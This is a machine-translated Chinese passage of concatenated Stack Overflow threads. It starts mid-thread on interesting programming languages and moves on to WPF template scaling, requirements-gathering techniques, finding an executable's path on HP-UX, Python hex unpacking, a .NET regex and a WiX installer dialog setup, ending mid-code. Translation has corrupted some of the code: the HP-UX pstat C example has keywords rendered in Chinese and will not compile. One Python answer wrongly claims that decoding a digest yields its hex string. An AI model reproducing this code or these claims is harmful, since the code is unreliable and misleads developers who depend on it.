看起来至少[有其他人同意我的观点，即 COME FROM 就像 AOP](http://c2.com/cgi/wiki?ComeFrom)

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2008-10-19T05:37:37.983

Mathematica 因为它是一种非常成功的术语重写语言（一种完全不同的代码评估方法！）。

* * *

## 回答 #27

> 赞同：1
> 
> 时间：2008-10-19T07:24:30.480

雷亚！

> [http://wiki.reia-lang.org/wiki/Reia_Programming_Language](http://wiki.reia-lang.org/wiki/Reia_Programming_Language)

Erlang 是有道理的，它很漂亮，我恋爱了。它是如此不为人知，甚至没有维基百科页面！

* * *

## 回答 #28

> 赞同：1
> 
> 时间：2009-04-28T02:53:12.670

我学到的第一个主要（非 BASIC）语言是 Dream Maker，来自[http://www.byond.com](http://www.byond.com)。它有点类似于 C++ 或 Java，但它在很大程度上是为设计多人在线游戏而预先构建的。它非常基于继承。它是一种有趣的语言，尤其是作为入门语言，它可以更快地获得令人满意的结果，而且说实话，大多数第一次学习编程的人都对一件事感兴趣……游戏。

* * *

## 回答 #29

> 赞同：1
> 
> 时间：2009-05-01T12:45:43.360

我发现[Factor](http://en.wikipedia.org/wiki/Factor_(programming_language))、[Oz](http://en.wikipedia.org/wiki/Oz_(programming_language))和[OCaml](http://en.wikipedia.org/wiki/OCaml)很有趣。事实上，我已经开始将 Factor 用于个人项目。

* * *

## 回答 #30

> 赞同：1
> 
> 时间：2009-06-23T01:48:50.263

当然是Rebol！它是如此简单但如此强大，请在[http://reboltutorial.com学习它](http://reboltutorial.com "Reboltutorial.com")

* * *

## 回答 #31

> 赞同：1
> 
> 时间：2009-06-23T02:12:22.993

我最近查阅了很多关于 Windows [PowerShell](http://www.microsoft.com/windowsserver2003/technologies/management/powershell/default.mspx)的信息。

虽然不一定**只是**一种语言。这是一个很棒的 shell，有一个内置的脚本语言。它基本上是一个超级增强的命令行 shell。

与 Unix shell 不同，所有内容都是字符串文本（这肯定有它的好处），PowerShell 命令 (cmdlet) 使用对象。它基于 .Net 框架，所以熟悉它的人可能已经发现 PowerShell 返回的任何东西都可以通过管道传输，并且可以使用该对象的属性和方法。说“一切都是对象”很有趣！就像 OOP 变大时一样。

很整洁的东西。第一次，Windows 实现了一些类似于 grep 的 Unix 命令行界面工具。

* * *

## 回答 #32

> 赞同：1
> 
> 时间：2009-06-23T02:12:25.910

如果您对虚拟机感兴趣，您应该看看[Parrot](http://www.parrot.org/) ...支持多种语言，而且非常简洁....

如果您想学习如何实现编译器，O'caml 是一门很好的语言......

* * *

## 回答 #33

> 赞同：1
> 
> 时间：2009-12-01T22:21:59.750

Eiffel 为静态类型。

* * *

## 回答 #34

> 赞同：1
> 
> 时间：2010-01-18T13:45:20.227

我衷心推荐 Tcl。我认为这符合您很好地使用语言的心态。

老实说，这并不陌生。由于 Tk 的流行，大多数程序员迟早会遇到它。但是大多数程序员都像瘟疫一样回避和避免它，因此大多数程序员并不完全了解该语言。在我看来，这是不公平的——他们只是不理解可以从它的简单语义中提取的美丽和力量。

Tcl 是一种非常有趣的语言。以 tcl 中的 OO 为例。在 tcl 中为 tcl 设计 OO 系统几乎是一种爱好。每年都会有人想出一个新的。当然，对于生产代码，大多数将使用已建立的库——没错，在 tcl 中，OO 只是一个库！

tcl 社区一直在玩的另一个游戏是试图让 tcl 解释器理解其他语言的语法和/或语义。如下图所示：

*   [http://wiki.tcl.tk/播放序言](http://wiki.tcl.tk/Playing%20Prolog)
*   [http://wiki.tcl.tk/玩 Python](http://wiki.tcl.tk/Playing%20Python)
*   [http://wiki.tcl.tk/播放 APL](http://wiki.tcl.tk/Playing%20APL)
*   [http://wiki.tcl.tk/玩 COBOL](http://wiki.tcl.tk/Playing%20COBOL)
*   [http://wiki.tcl.tk/播放 LISP](http://wiki.tcl.tk/Playing%20LISP)
*   [http://wiki.tcl.tk/玩 Smalltalk](http://wiki.tcl.tk/Playing%20Smalltalk)
*   [http://wiki.tcl.tk/Playing Joy](http://wiki.tcl.tk/Playing%20Joy)

您可以玩更多游戏，例如从解释器中删除所有条件构造，看看您是否可以从中构建可用的编程语言。这引发了关于纯函数式编程的讨论，进而引发了组合逻辑、柯里化和教堂数字。

非常有趣的东西。

* * *

## 回答 #35

> 赞同：0
> 
> 时间：2008-10-14T12:47:41.270

[Lava](http://lavape.sourceforge.net/)是一种非常有趣的实验语言。它试图合并一些对 RAD 非常有用的新概念。目前它没有实际用途，但从长远来看仍然很有趣。

更实用但同样有趣的是[L.in.oleum](http://www.anywherebb.com/)（选择部分，链接太长无法粘贴）语言。它是一种像汇编一样的低级语言，但更容易学习，也声称是跨平台的（未经个人测试）。一些非常好的程序是用这种语言开发的（在网站上查看）。

当然，一些更常见的语言也有助于学习并提供一些有趣的观点：

*   ADA：很好的概念，易于学习编码，也用于军事项目，美国宇航局和波音公司。
*   Ruby：超级好学的oo脚本语言，GUI测试和Web开发必备。
*   ERLANG：主要被爱立信用于并发编程，也是一种函数式语言。
*   徽标：用于教小学生的语言（又名 Lisp，适合初学者）。

最后，我推荐[Context Free](http://www.contextfreeart.org/)，它是一种用于创建复杂的计算机生成艺术作品的语言。

* * *

## 回答 #36

> 赞同：0
> 
> 时间：2009-04-20T22:06:18.093

我将支持[Digital Mars D](http://digitalmars.com/d/)语言的议案。它具有 C# 或 Python 的许多生产力特性，但具有 C 的低级功能。它是学习一些 C 概念的好语言，还提供内联汇编器（用于学习）并通过合约、委托支持许多编程范式，以及一些反思。它还具有非常好的数组处理和完整的 Unicode 支持。

此外，如果 OCamL 对您来说很有趣，也许可以查看受 OCamL 启发的[F# 。](http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/)这是一种新的 .NET 语言，目前仅在“社区预览版”中发布，但它看起来很酷。

* * *

## 回答 #37

> 赞同：0
> 
> 时间：2009-06-23T01:54:46.180

你听说过[OHRRPG.CE](http://hamsterrepublic.com/ohrrpgce/index.php/Main_Page.html)游戏引擎吗？

用于“脚本”游戏的编译（！）语言怎么样？

只是对于初学者，**编译器会去除空格**。不是连续的空格，**所有的空格**。写“walk hero north”与“walkheronorth”和“walkheron rt h”相同。

我已经很久没有使用它了，我之前抱怨的许多事情（例如在源代码的最顶部为每个函数定义参数，然后将函数本身放入）已经得到修复。

另外，我只想再提一下，是的，您必须先编译脚本，然后才能将它们导入游戏，尽管游戏编辑器本身没有理由不包含编译器。

* * *

## 回答 #38

> 赞同：0
> 
> 时间：2009-10-04T09:22:52.200

[来自Autoplay Media Studio](http://www.indigorose.com/autoplay-media-studio/overview-autoplay-media-studio/)的 AMS 脚本。它是 Lua 的超集。

* * *

## 回答 #39

> 赞同：0
> 
> 时间：2009-10-04T09:48:47.373

[Lolcode](http://lolcode.com/)是我遇到的最有趣和最有趣的编程语言之一。

* * *

## 回答 #40

> 赞同：0
> 
> 时间：2010-01-18T12:50:26.683

对我来说，那将是[Joy 编程语言](http://en.wikipedia.org/wiki/Joy_(programming_language))，它是一种优雅的基于堆栈的函数式语言。如果您对此类语言的实现感兴趣，可以查看类似的[Cat 编程语言](http://www.cat-language.com)，但具有静态类型系统。有可用的 C# 和其他语言的实现。

注意：我应该透露我实际上是 Cat 的作者。

* * *

## 回答 #41

> 赞同：0
> 
> 时间：2010-01-18T13:27:17.057

**Nemerle** [http://nemerle.org/Main_Page](http://nemerle.org/Main_Page)。

它用于 .NET 平台的强大的静态类型编程语言。它支持函数式编程范式以及面向对象的范式。Nemerle 宏使这种语言非常强大和可扩展。有关宏的更多信息，请参见[http://nemerle.org/Macros](http://nemerle.org/Macros)

* * *

**埃菲尔** [http://eiffel.com](http://eiffel.com)

它是有史以来最强大和真正面向对象的语言之一。我们可以使用这种语言在 C 代码或 .Net 平台上编译。它是契约式设计和 Void Safety 的第一语言，可以显着减少应用程序中的错误。

有关 Void Safety 和 CAR Hoare 的“十亿美元错误”的更多信息：

B.Meyer “Void Safety：结束 Null Dereferencing 的瘟疫”，Dobb 博士的期刊 01，2009，http: [//www.ddj.com/architect/219500827](http://www.ddj.com/architect/219500827)或[http://se.ethz.ch/ ~meyer/publications/hoare/void-safety.pdf](http://se.ethz.ch/~meyer/publications/hoare/void-safety.pdf)

* * *

## 回答 #42

> 赞同：0
> 
> 时间：2010-03-03T21:36:15.313

**Poplog**很棒。IIRC 它是 Prolog、lisp 和其他一些语言的混合体。试想一下，如果所有 70 年代的编程语言都有狂欢并且意外地生了孩子。

它是在人工智能课程中首次介绍给我的，有了它，你可以制作一个不到 100 行的聊天机器人，不包括字典。

这很棒。

更多信息可以[在维基百科上找到。](http://en.wikipedia.org/wiki/Poplog)

* * *

## 回答 #43

> 赞同：-2
> 
> 时间：2008-10-14T11:05:58.030

以下设置应该让您忙碌：

FORTRAN - 在工程界流行了太多年的简单语言
LISP - 经典的 AI 语言。在我看来 Prolog 更好，但 LISP 更受欢迎
Ada - 给了世界包和泛型以及严格的数据类型。
ALGOL - 用于解决 FORTRAN 的许多问题。是C的爷爷，

在他们的时代，它们都是极具影响力的语言。

# wpf - 调整 XAML 属性的大小

> ID：200724
> 
> 赞同：3
> 
> 时间：2008-10-14T10:59:39.447
> 
> 标签：wpf, xaml, scaling

有没有办法让 XAML 属性随着它们所属的 uielements 的大小一起缩放？

本质上，我有一个控件模板，我创建的它太大而无法使用/主要是因为我想使用不同大小的相同控件。问题是我可以将控件大小设置为 Auto（在 ControlTemplate 中），但是内部模板元素的属性没有调整大小：例如，StrokeThickness 保持在 10，而它应该变为 1。

当我在模板上应用 ScaleTransform 时它工作得很好，但是这会导致控件在实际使用时太小：width/height=Auto 将控件调整为适当的大小*，然后*应用 scaletransform。所以我很喜欢一种不可扩展的控制。

我对 WPF 有点陌生，所以可能有一种简单的方法可以做到这一点......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-15T00:02:34.747

您的描述有点含糊，但听起来您需要一个将 Stretch 设置为 Uniform 的 ViewBox 作为控件的根元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T12:15:52.740

您可以尝试在运行时将模板内控件的宽度和高度分别绑定到模板化控件的宽度和高度。就像是：

```
<Button>
    <Button.Template>
        <ControlTemplate TargetType={x:Type Button}>
            <Border Width="{TemplateBinding Property=ActualWidth}"
                    Height="{TemplateBinding Property=ActualHeight}">
                <ContentPresenter />
             </Border>
         </ControlTemplate>
    </Button.Template>
</Button> 
```

请注意，绑定源是模板化控件的**FrameworkElement.ActualWidth**和**FrameworkElement.ActualHeight**属性。这些属性包含控件在呈现后的宽度和高度，这可能与在**Width**和**Height**属性中指定的值不同。这是因为这些值最终在运行时计算，并考虑了可视化树中任何父控件的大小。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-11-18T21:49:37.290

太糟糕了，您不能为 StackPanel、DockPanel、Grid 或任何其他容器创建控件模板。

# specifications - 查明缺失需求的基本技术？

> ID：200729
> 
> 赞同：7
> 
> 时间：2008-10-14T11:03:59.313
> 
> 标签：specifications

需求规范的初稿已经完成，现在是评估需求、[审查规范的](https://stackoverflow.com/questions/186716/when-reviewing-requirements-specification-what-deadly-sins-need-to-be-addressed)时候了。此过程的一部分是确保规范中没有相当大的差距。不用说，这些差距会导致估计非常不准确、项目后期不可避免的范围蔓延，并最终导致死亡行军。

**有哪些好的、有效的技术可以用来确定缺失的和隐含的需求？**

*   这个问题是关于实用技术的，而不是一般的建议、原则或指导方针。
*   缺少需求对于产品或服务的完整性至关重要，但没有被考虑或忘记，
*   隐式需求是用户或客户自然认为将成为软件的标准部分而无需明确要求的东西。

[我很高兴重新访问已接受的答案，只要有人提交更好、更全面的解决方案。]

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-14T11:10:29.783

**就我而言，**与客户进行持续、频繁、坦率和双向的沟通是我认为的主要“技巧”。****

 *** * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T15:46:26.417

这取决于。

这取决于您是否因交付您所说的交付或向客户交付高质量软件而获得报酬。

如果是前者，只需消除规范中的歧义，然后构建您同意的内容。尽量远离任何不可衡量的事物（如“快速”、“酷”、“活泼”等）。

如果是后者，Galwegian 所说的 + 时间，或者干脆削减一切并非绝对关键的东西，并尽快建立它。生产有一种非凡的方式来阐明您在分析中遗漏的内容。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T12:42:58.083

以下是您如何找到缺失的要求。

1.  将需求分解为微小的增量。真的很小。可以在两周或更短的时间内完成的东西。你会发现很多空白。

2.  优先考虑那些最好先拥有的东西，其次才是真正无关紧要的东西。你会发现一些空白填充物并不重要。您还会发现一些最初的“要求”仅仅是可取的。

3.  辩论关于什么对最终用户最重要以及为什么最重要的意见分歧。两个用户会有三种意见。你会发现有些用户没有头绪，他们的“要求”都不是必需的。你会发现有些人没有脊梁骨，不敢大声说出来的话是“必须的”。

4.  只对前两三个达成共识。不要争论每一个细微差别。想象软件是不可能的。任何人都无法想象软件会是什么样子以及他们将如何使用它。大多数人的“要求”描述了如何努力解决他们今天所坚持的不充分的业务流程。

5.  首先构建优先级最高、最重要的部分。给用户。

6.  转到 1 并重复该过程。

“等等，”你说，“总预算呢？” 怎么样？你永远无法知道总预算。请执行下列操作。

查看步骤 1 中定义的每个增量。提供每增量价格。按优先顺序。这样人们就可以随心所欲地挑选。没有大而可怕的“有很多零的大预算估算”。都是可以商量的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-29T04:38:04.303

我一直在使用一种称为行为工程 (bE) 的建模方法，它使用原始规范文本来创建结果模型，当您拥有模型时，更容易识别需求的缺失或不完整部分。

到目前为止，我已经在大约六个项目中使用了该方法，从不到 100 个需求到超过 1300 个需求。如果您想了解更多信息，我建议您访问[www.behaviorengineering.org](http://www.behaviorengineering.org)，那里有一些关于该方法的非常好的论文。

我工作的公司创建了一个工具来执行建模。实际创建模型的工作量大约是新手 5 个要求，专家每小时大约 13 个要求。该方法的一个很酷的地方是，您不需要真正了解规范所针对的领域的任何信息。仅使用名词和动词等用户文本，建模者将在很短的时间内发现模型中的空白。

我希望这有帮助

迈克尔·拉森

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-29T04:52:34.913

相对于通用/整体模型评估模型元素的生命周期，例如

```
acquisition --> stewardship --> disposal 
```

*   您知道每个实体来自哪里以及如何将其放入您的系统吗？
*   您是否知道每个实体一旦被收购，将驻留在何处以及驻留多长时间？
*   当不再需要每个实体时，您知道如何处理它吗？

为了对规范中实体的生命周期进行更细粒度的分析，为需求中的主要实体制作 CRUDE 矩阵；这是一个矩阵，其中操作/应用程序作为行，实体作为列。在每个单元格中，如果应用程序创建实体，则放置一个 C，R 代表读取，U 代表更新，D 代表删除，或 E 代表“编辑”；“E”包含 C、R、U 和 D（大多数“主表维护”应用程序将是 Es）。然后检查每一列的 C、R、U 和 D（或 E）；如果缺少一个（E除外），请确定是否需要。矩阵的行和列可以重新排列（手动或使用亲和力分析）以形成通常对应于子系统的实体和应用程序的凝聚力组；这可能有助于以后的物理系统分布。

将“用户”实体列添加到 CRUDE 矩阵并为每个应用程序（或特性或功能区域或任何您想要调用的需求的处理/行为方面）指定它是否从用户那里获取输入也是有用的，为用户生成输出，或与用户交互（我为此使用 I、O 和 N，并且始终将用户设为第一列）。这有助于确定需要用于数据输入和报告的用户界面。

目标是检查规范的完整性；上述技术可用于检查实体的生命周期是否相对于已识别的实体和应用程序“关闭”

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-14T15:50:58.220

建立一个原型怎么样？

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-11-04T19:34:17.093

在阅读大量有关软件需求的文献时，我发现了这两本有趣的书：

*   [问题框架：分析和构建软件开发问题](https://rads.stackoverflow.com/amzn/click/com/020159627X)迈克尔杰克逊（不是歌手！:-)。

*   [实用软件要求：](https://rads.stackoverflow.com/amzn/click/com/1884777597) Bendjamen Kovitz 的内容和风格手册。

这两位作者确实从人群中脱颖而出，因为在我看来，他们正在做出非常好的尝试，将需求开发变成一个非常系统的过程——更像是工程而不是艺术或黑魔法。特别是迈克尔杰克逊对真正需求的定义——我认为这是我见过的最清晰、最精确的定义。

我不会为这些试图在此处的简短帖子中描述他们的方法的作者提供良好的服务。所以我不会那样做。但我会尝试解释，**为什么他们的方法似乎与您的问题极为相关**：它允许您将大部分（不是全部，而是大多数！）需求开发工作归结为处理一堆清单*告诉您您必须定义什么要求才能涵盖整个客户问题的所有重要方面。换句话说，**这种方法应该将遗漏重要需求（包括那些经常保持隐含的需求）的风险降到最低**。

我知道这听起来像是魔术，但事实并非如此。找到那些“神奇”的清单仍然需要大量的脑力劳动：你必须首先阐明客户的问题，然后彻底分析它，最后将其分解成所谓的“问题框架”（这些神奇的仅当它们与作者定义的一些典型问题框架非常匹配时才使用检查表）。就像我说的，这种方法并不能保证让一切变得简单。但它绝对承诺使需求开发过程尽可能系统化。

If requirements development in your current project is already quite far from the very beginning, it may not be feasible to try to apply the Problem Frames Approach at this point (although it greatly depends on how your current requirements are organized). Still, I highly recommend to read those two books - they contain a lot of wisdom that you may still be able to apply to the current project.

My last important notes about these books:

*   As far as I understand, Mr. Jackson is the original author of the idea of "problem frames". His book is quite academic and theoretical, but it is very, very readable and even entertaining.

*   Mr. Kovitz' book tries to demonstrate how Mr. Jackson ideas can be applied in real practice. It also contains tons of useful information on writing and organizing the actual requirements and requirements documents.

You can probably start from the Kovitz' book (and refer to Mr. Jackson's book only if you really need to dig deeper on the theoretical side). But I am sure that, at the end of the day, you should read both books, and you won't regret that. :-)

HTH...

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-14T12:39:22.457

我同意Galwegian。所描述的技术比“等待客户对我们大喊大叫”的方法有效得多。

# c++ - 获取HPUX上运行进程可执行文件的完整路径

> ID：200737
> 
> 赞同：1
> 
> 时间：2008-10-14T11:07:30.880
> 
> 标签：c++, c, hp-ux

我想在没有使用 C++ 代码的 root 权限的情况下获取正在运行的进程（可执行文件）的完整路径。有人可以建议一种方法来实现这一点。

在 Linux 平台上，我可以使用以下方式来做到这一点。

```
char exepath[1024] = {0};
char procid[1024] = {0};
char exelink[1024] = {0};

sprintf(procid, "%u", getpid());

strcpy(exelink, "/proc/");
strcat(exelink, procid);
strcat(exelink, "/exe");

readlink(exelink, exepath, sizeof(exepath)); 
```

这里 exepath 为我们提供了可执行文件的完整路径。

同样，对于 Windows，我们使用

```
GetModuleFileName(NULL, exepath, sizeof(exepath));  /* get fullpath of the service */ 
```

请帮助我如何在 HP-UX 上执行此操作，因为 HP-UX 中没有 /proc 目录。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-11-09T07:24:41.120

首先，我想评论一下您的 Linux 解决方案：它大约是需要的 5 倍，并且执行了许多完全不必要的操作，以及使用 1024 幻数，这是完全错误的：

```
$ grep PATH_MAX /usr/include/linux/limits.h 
#define PATH_MAX        4096    /* # chars in a path name */ 
```

这是一个正确的最小替换：

```
#include <limits.h>
...
  char exepath[PATH_MAX] = {0};
  readlink("/proc/self/exe", exepath, sizeof(exepath)); 
```

其次，在 HP-UX 上，您可以使用它`shl_get_r()`来获取有关所有已加载模块的信息。在索引 0 处，您将找到有关主可执行文件的信息。将`desc.filename`指向当时可执行文件的名称`execve(2)`。

不幸的是，该名称是相对的，因此您可能必须搜索`$PATH`，并且如果应用程序搜索`putenv("PATH=some:new:path")`或如果原始 exename 是 eg`./a.out`并且应用程序从那时起执行，则可能会失败`chdir(2)`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-23T14:52:24.167

在 HP-UX 上，使用 pstat：

```
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>

#define _PSTAT64
#include <sys/pstat.h>

int main(int argc, char *argv[])
{
  字符文件名[PATH_MAX];
  结构 pst_status s;

  if (pstat_getproc(&s,sizeof(s),0,getpid()) == -1) {
    perror("pstat_getproc");
    返回 EXIT_FAILURE；
  }

  if (pstat_getpathname(filename,sizeof(filename),&s.pst_fid_text) == -1) {
    perror("pstat_getpathname");
    返回 EXIT_FAILURE；
  }

  printf("文件名: %s\n",文件名);

  返回 EXIT_SUCCESS；
}

```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T19:25:07.957

出于什么目的需要可执行路径？请记住，正如我在之前的帖子中所说，不能保证可执行文件的路径会存在，或者它是唯一的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T16:20:45.147

较早的关于 Unix Programming FAQ 的答案是正确的。问题是，即使使用 Linux /proc 的答案，可执行文件的路径自 exec() 以来可能已更改。事实上，可执行文件可能已被删除。考虑链接（包括符号链接和硬链接）会产生进一步的复杂性——同一个可执行文件可能有多个路径。没有涵盖所有情况的通用答案，因为可能没有剩余路径，如果有路径，它可能不是唯一的。

也就是说，使用 argv[0] 和一些逻辑，正如 cjhuit 之前所提倡的，可能会在 99.9% 的时间里做你想做的事。在进行相对路径检查之前，我会添加对包含“/”的路径的检查（请注意，您必须在任何 cwd() 调用之前执行此操作）。请注意，如果您的调用程序感觉很调皮，那么在 fork() 和 exec() 之间可以做很多事情来搞砸它。不要依赖它来处理可能影响应用程序安全性的任何事情（例如配置文件的位置）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T13:54:23.663

我以前在一般情况下这样做过。大致思路是抓取argv[0]，对其进行一些处理：

```
int main( int argc, char** argv )
{
  string full_prog_path = argv[0];
  if ( full_prog_path[0] == "/" )
  {   // It was specified absolutely; no processing necessary.
  }
  else
  {
    string check_cwd = getcwd();
    check_cwd += argv[0];
    if ( FileExists( check_cwd ) )
    { // It was specified relatively.
      full_prog_path = check_cwd;
    }
    else
    { // Check through the path to find it
      string path = getenv( "PATH" );
      list<string> paths = path.split( ":" );
      foreach( test_path, paths )
      {
        if ( FileExists( test_path + argv[0] ) )
        { // We found the first path entry with the program
          full_prog_path = test_path + argv[0];
          break;
        }
      }
    }
  }

  cout << "Program path: " << full_prog_path << endl;

  return 0;
} 
```

显然，这有一些假设可能会在某些时候打破，但它应该适用于大多数情况。

# python - 如何在 Python 中解压缩二进制十六进制格式的数据？

> ID：200738
> 
> 赞同：7
> 
> 时间：2008-10-14T11:08:07.277
> 
> 标签：python, binary, hex

使用 PHP [pack()](http://www.php.net/pack)函数，我将字符串转换为二进制十六进制表示：

```
$string = md5(time); // 32 character length
$packed = pack('H*', $string); 
```

H* 格式表示“十六进制字符串，高半字节优先”。

要在 PHP 中解包，我只需使用带有 H* 格式标志的[unpack()函数。](http://www.php.net/unpack)

我将如何在 Python 中解压这些数据？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-14T14:15:26.693

使用该`binascii`模块有一种简单的方法：

```
>>> import binascii
>>> print binascii.hexlify("ABCZ")
'4142435a'
>>> print binascii.unhexlify("4142435a")
'ABCZ' 
```

除非我对半字节排序有误解（高半字节优先是默认设置……任何不同的东西都是疯狂的），那应该就足够了！

此外，Python 的`hashlib.md5`对象具有`hexdigest()`自动将 MD5 摘要转换为 ASCII 十六进制字符串的方法，因此对于 MD5 摘要甚至不需要此方法。希望有帮助。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-10-14T11:59:32.960

struct.pack 没有相应的“hex nibble”代码，因此您需要先手动打包成字节，例如：

```
hex_string = 'abcdef12'

hexdigits = [int(x, 16) for x in hex_string]
data = ''.join(struct.pack('B', (high <<4) + low) 
               for high, low in zip(hexdigits[::2], hexdigits[1::2])) 
```

或者更好的是，您可以只使用十六进制编解码器。IE。

```
>>> data = hex_string.decode('hex')
>>> data
'\xab\xcd\xef\x12' 
```

要解压，您可以类似地将结果编码回十六进制

```
>>> data.encode('hex')
'abcdef12' 
```

但是，请注意，对于您的示例，编码时可能根本不需要通过十六进制表示进行往返。直接使用 md5 二进制摘要即可。IE。

```
>>> x = md5.md5('some string')
>>> x.digest()
'Z\xc7I\xfb\xee\xc96\x07\xfc(\xd6f\xbe\x85\xe7:' 
```

这等效于您的 pack()ed 表示。要获得十六进制表示，请使用上述相同的解包方法：

```
>>> x.digest().decode('hex')
'acbd18db4cc2f85cedef654fccc4a4d8'
>>> x.hexdigest()
'acbd18db4cc2f85cedef654fccc4a4d8' 
```

[编辑]：更新为使用更好的方法（十六进制编解码器）

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-10-14T11:17:11.547

在 Python 中，您为此使用[struct](https://docs.python.org/2/library/struct.html)模块。

```
>>> from struct import *
>>> pack('hhl', 1, 2, 3)
'\x00\x01\x00\x02\x00\x00\x00\x03'
>>> unpack('hhl', '\x00\x01\x00\x02\x00\x00\x00\x03')
(1, 2, 3)
>>> calcsize('hhl')
8 
```

高温高压

# .net - 如何编写 .Net 正则表达式以从行尾匹配

> ID：200742
> 
> 赞同：0
> 
> 时间：2008-10-14T11:11:03.430
> 
> 标签：.net, regex

我有以下文本行

```
Reference=*\G{7B35DDAC-FFE2-4435-8A15-CF5C70F23459}#1.0#0#..\..\..\bin\App Components\AcmeFormEngine.dll#ACME Form Engine 
```

并希望将以下内容作为两个单独的捕获组进行抓取：

```
AcmeFormEngine.dll
ACME Form Engine 
```

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-14T11:23:40.987

如果你对字符串格式有诚意，你也可以用接地气的方式解决这个问题，没有正则表达式：取'\'的最后一个索引之后的所有内容，并将其拆分为'#'。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T11:16:31.673

```
 using System.Text.RegularExpressions;

    Regex regex = new Regex(
    @"\\(?<filename>[\w\.]+)\#(?<comment>[\w ]+)$",
    RegexOptions.IgnoreCase
    | RegexOptions.Compiled
    ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T11:17:35.463

```
Regex r = new Regex("\\(.+?)\#(.+?)$"); 
```

非贪婪的多重性很棒。

`'$'`: 匹配字符串的结尾。

`"\#(.+?)"`：匹配从字符串末尾到第一个“#”字符的所有内容，并在捕获中返回。

`"\\(.+?)"`：同样，除了转义的“\”。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T12:38:08.093

**我投票支持 tomalask 的非正则表达式方法。** 但是，如果你不得不用正则表达式来做，我认为你需要这样的东西

```
\\([^\\/?"<>|]+?)\#([^\\/?"<>|]+?)[\r\n]*$ 
```

这将允许在文件名中有效的 - 和 _ 之类的内容，它的 2 个相同组（每个组不包括 win32 文件名的无效字符）以斜杠开头，由 # 分隔，并在行尾（$）。假设第二组也是有效的 win32 文件名。我在匹配的第二组中看到了一些丑陋的框， [\r\n]* 将它们拒之门外。

```
e.g. F5C70F23459}#1.0#0#..\..\..\bin\App Components\Acme_Form-Engine.dll#ACME Form Engine
group#1 => Acme_Form-Engine.dll
group#2 => ACME Form Engine 
```

简而言之，这是奥术......尽可能避免。

# wix - 只有欢迎屏幕和已完成屏幕的 WiX 脚本

> ID：200743
> 
> 赞同：27
> 
> 时间：2008-10-14T11:11:24.477
> 
> 标签：wix, installation, windows-installer

我需要一个 WiX 3 脚本来显示以仅显示 2 个对话框：欢迎和已完成。那就是不需要 EULA、文件夹选择等。所有帮助表示赞赏。

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2008-11-03T19:39:55.613

您需要做的就是在您的 WIX 脚本中添加它，它会在安装前为您提供 WelcomeDlg 并显示安装进度，然后是退出对话框。不要忘记将 WixUIExtension.dll 添加到您的引用中。

```
<UI Id="UserInterface">
  <Property Id="WIXUI_INSTALLDIR" Value="TARGETDIR" />
  <Property Id="WixUI_Mode" Value="Custom" />

  <TextStyle Id="WixUI_Font_Normal" FaceName="Tahoma" Size="8" />
  <TextStyle Id="WixUI_Font_Bigger" FaceName="Tahoma" Size="9" Bold="yes" />
  <TextStyle Id="WixUI_Font_Title"  FaceName="Tahoma" Size="9" Bold="yes" />

  <Property Id="DefaultUIFont" Value="WixUI_Font_Normal" />

  <DialogRef Id="ProgressDlg" />
  <DialogRef Id="ErrorDlg" />
  <DialogRef Id="FilesInUse" />
  <DialogRef Id="FatalError" />
  <DialogRef Id="UserExit" />

  <Publish Dialog="ExitDialog" Control="Finish" Event="EndDialog" Value="Return" Order="999">1</Publish>
  <Publish Dialog="WelcomeDlg" Control="Next" Event="EndDialog" Value="Return" Order="2"></Publish>

</UI>
<UIRef Id="WixUI_Common" /> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-07-28T21:13:06.277

如果您使用的是 Visual Studio 和 Wix 3.8，那么您可以创建 Wix 安装项目并使用下面的文本作为 Product.wxs 的内容。在我的情况下，我需要将 python 和文本文件复制到目标目录中。再次感谢CheGueVerra同志的原创杰作：

```
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">

  <Product Id="*" Name="testwixsetup" Language="1033" Version="2.1.3.0" Manufacturer="ttt" UpgradeCode="PUT-GUID-HERE">
        <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />

        <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed." />     
    <MediaTemplate EmbedCab="yes"/>

        <Feature Id="ProductFeature" Title="testwixsetup" Level="1">
            <ComponentGroupRef Id="ProductComponents" />
        </Feature>

    <UI Id="UserInterface">
      <Property Id="WIXUI_INSTALLDIR" Value="TARGETDIR" />
      <Property Id="WixUI_Mode" Value="Custom" />

      <TextStyle Id="WixUI_Font_Normal" FaceName="Tahoma" Size="8" />
      <TextStyle Id="WixUI_Font_Bigger" FaceName="Tahoma" Size="9" Bold="yes" />
      <TextStyle Id="WixUI_Font_Title"  FaceName="Tahoma" Size="9" Bold="yes" />

      <Property Id="DefaultUIFont" Value="WixUI_Font_Normal" />

      <DialogRef Id="ProgressDlg" />
      <DialogRef Id="ErrorDlg" />
      <DialogRef Id="FilesInUse" />
      <DialogRef Id="FatalError" />
      <DialogRef Id="UserExit" />
